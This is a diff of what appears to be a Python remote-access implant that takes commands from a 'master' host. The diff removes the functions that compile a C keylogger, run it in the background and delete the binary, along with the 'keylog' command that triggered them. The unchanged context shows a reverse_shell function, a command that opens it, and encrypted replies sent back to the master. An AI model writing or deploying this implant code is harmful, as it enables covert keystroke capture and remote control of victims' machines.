@@ -24,33 +24,6 @@ def reverse_shell(master_hostname, shell_port):
             # reborn(master_hostname, master_port)
     exit(0)
 
-def compile_keylogger():
-    # compile keylogger into executable for correct arch
-    pid = fork()
-    if pid == 0:
-        pid2 = fork()
-        if pid2 == 0:
-            # export cls="/usr/bin/gcc keylogger.c -o top"
-            # code script to copy ove all c code on one file and obfuscate it as well
-            system("gcc tools/keylogger.c -o keylogger >/dev/null 2>&1")
-            exit(0)
-        exit(0)
-
-def run_keylogger():
-    # run keylogger executable
-    pid = fork()
-    if pid == 0:
-        pid2 = fork()
-        if pid2 == 0:
-            # ./top
-            sleep(2)
-            system("./keylogger &")
-            sleep(2)
-            system("rm keylogger")
-            exit(0)
-        exit(0)
-
-
 def send_res(conn, res):
     # encrypted plain text response and send to master
     try:
@@ -125,12 +98,7 @@ def cmd_shell(conn, master_hostname, master_port):
             shell_port = int(cmd[5:])
             sleep(1)
             reverse_shell(master_hostname, shell_port)
-        
-        elif cmd[:6] == "keylog":
-            compile_keylogger()
-            run_keylogger()
-            res = "[*] Started keylogging"
-            conn = send_res(conn, res)
+            
         else:
             res = "404could not find command"
             conn = send_res(conn, res)
